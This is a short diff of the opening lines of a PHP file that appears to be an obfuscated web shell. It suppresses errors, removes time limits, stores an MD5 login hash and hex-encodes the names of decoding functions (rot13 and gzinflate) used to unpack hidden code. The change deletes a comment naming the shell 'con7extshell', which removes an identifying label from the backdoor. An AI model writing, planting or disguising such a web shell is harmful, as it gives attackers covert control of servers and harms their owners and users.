@@ -2,7 +2,7 @@
 session_start();
 set_time_limit(0);
 error_reporting(0);
-$auth_pass = "b928ed0200f5fcb13d7ea78d2cc2124b"; // con7extshell
+$auth_pass = "b928ed0200f5fcb13d7ea78d2cc2124b";
 $st = "\x73\x74\x72\x5f\x72\x6f\x74\x31\x33";
 $gz = "\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65";
 $st2 = "\x73\x74\x72\x5f\x72\x6f\x74\x31\x33";
